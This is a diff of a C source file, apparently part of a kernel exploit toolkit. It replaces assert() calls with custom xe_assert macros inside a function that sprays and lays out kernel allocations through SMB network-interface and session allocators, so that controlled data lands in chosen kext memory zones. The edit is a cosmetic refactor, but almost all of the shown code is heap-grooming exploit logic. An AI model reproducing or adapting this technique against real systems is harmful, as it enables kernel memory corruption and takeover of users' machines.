@@ -5,7 +5,6 @@
 //  Created by admin on 12/27/21.
 //
 
-#include <assert.h>
 #include <stdlib.h>
 #include <string.h>
 
@@ -23,6 +22,7 @@
 #include "util_misc.h"
 #include "util_log.h"
 #include "platform_constants.h"
+#include "util_assert.h"
 
 
 #define NUM_PAD_ELEMENTS (XE_PAGE_SIZE / 32)
@@ -40,7 +40,7 @@ const int zone_kext_sizes[] = {
 
 int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, size_t data_size, struct kmem_zkext_alloc_small_entry* out) {
     size_t alloc_size = data_size + 8;
-    assert(alloc_size < 256);
+    xe_assert(alloc_size < 256);
     
     int zone_size = -1;
     for (int i = 0; i < XE_ARRAY_SIZE(zone_kext_sizes); i++) {
@@ -49,7 +49,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
             break;
         }
     }
-    assert(zone_size > 0);
+    xe_assert(zone_size > 0);
     
     kmem_zkext_neighour_reader_t reader = kmem_neighbor_reader_create();
     
@@ -98,22 +98,22 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
         gap_info.addr_4.sin_addr.s_addr = gap_idx;
         
         int error = num_offsets > 0 ? smb_nic_allocator_allocate(offset_allocator, offset_infos, num_offsets, (uint32_t)sizeof(offset_infos)) : 0;
-        assert(error == 0);
+        xe_assert_err(error);
         error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* len, sa_family_t* family, char** data_out, size_t* data_out_size, size_t index) {
             *len = data_size + 8;
             *family = AF_INET;
             *data_out = data;
             *data_out_size = data_size;
         }, NULL);
-        assert(error == 0);
+        xe_assert_err(error);
         error = smb_nic_allocator_allocate(size_placeholder_allocator, &size_placeholder_info, 1, sizeof(size_placeholder_info));
-        assert(error == 0);
+        xe_assert_err(error);
         error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
-        assert(error == 0);
+        xe_assert_err(error);
     }
     
     int error = smb_nic_allocator_destroy(&size_placeholder_allocator);
-    assert(error == 0);
+    xe_assert_err(error);
     
     char* size_data = alloca(32);
     *size_data = 0xff;
@@ -122,11 +122,11 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
     dispatch_apply(NUM_SIZE_ELEMENTS / 4, DISPATCH_APPLY_AUTO, ^(size_t index) {
         char* domain_name = "d";
         int error = smb_ssn_allocator_allocate_adv(size_allocators[index], size_data, 32, size_data, 32, size_data, size_data, domain_name);
-        assert(error == 0);
+        xe_assert_err(error);
     });
     
     error = smb_nic_allocator_destroy(&gap_allocator);
-    assert(error == 0);
+    xe_assert_err(error);
     
     uint32_t pad_infos_size = sizeof(struct network_nic_info) * NUM_PAD_ELEMENTS / 2;
     struct network_nic_info* pad_infos = malloc(pad_infos_size);
@@ -139,7 +139,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
         info->addr_4.sin_addr.s_addr = i;
     }
     error = smb_nic_allocator_allocate(pad_allocator, pad_infos, NUM_PAD_ELEMENTS / 2, pad_infos_size);
-    assert(error == 0);
+    xe_assert_err(error);
     free(pad_infos);
     
     char data_reader[32];
